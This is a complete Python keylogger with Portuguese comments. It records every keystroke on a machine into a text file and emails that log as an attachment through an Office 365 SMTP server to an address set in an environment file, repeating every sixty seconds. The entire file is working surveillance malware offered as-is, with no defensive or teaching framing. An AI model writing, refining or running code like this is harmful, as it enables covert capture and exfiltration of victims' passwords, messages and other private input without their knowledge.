import os
from dotenv import load_dotenv

from pynput import keyboard
from threading import Timer

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

load_dotenv(".env")

EMAIL_ORIGEM = os.getenv("EMAIL_ORIGEM")
EMAIL_DESTINO = os.getenv("EMAIL_DESTINO")
PASSWORD = os.getenv("PASSWORD")

def enviar_email():
    
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ORIGEM
    msg["To"] = EMAIL_DESTINO
    msg["Subject"] = "Dados capturados pelo keylogger"
    
    body = "As teclas capturadas estão armazenadas no anexo em um arquivo .txt"
    
    msg.attach(MIMEText(body, "plain"))
    
    filename = "C:/Users/User/Documents/Python/logkeys.txt"
    
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        
    encoders.encode_base64(part)
    
    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
    
    msg.attach(part)
    
    try:
        server = smtplib.SMTP("smtp.office365.com", 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, PASSWORD)
        server.send_message(msg)
        server.quit()
    except smtplib.SMTPException as e:
        print(f"Ocorreu uma exceção SMTP: {e}")
        
    Timer(60, enviar_email).start()

def on_press(key):
    try:
        # Tenta escrever o caractere da tecla.
        # Isso funciona para chaves alfanuméricas (letras, números, etc.).
        with open("logkeys.txt", "a", encoding="utf-8") as file:
            file.write(key.char)
            
    except AttributeError:
        # Trata as chaves especiais (espaço, enter, backspace, etc.).
        with open("logkeys.txt", "a", encoding="utf-8") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                # Trata a tecla Backspace: move o ponteiro para o fim do arquivo e apaga um caractere.
                file.seek(0, 2) # move o cursor para o final
                pos = file.tell() # pega a posição atual do cursor
                if pos > 0: # garante que não está tentando apagar de um arquivo vazio
                    file.seek(pos - 1) # volta um caractere
                    file.truncate() # apaga o resto do arquivo (o último caractere)
            else:
                pass            

with keyboard.Listener(on_press=on_press) as listner:
    enviar_email()
    listner.join()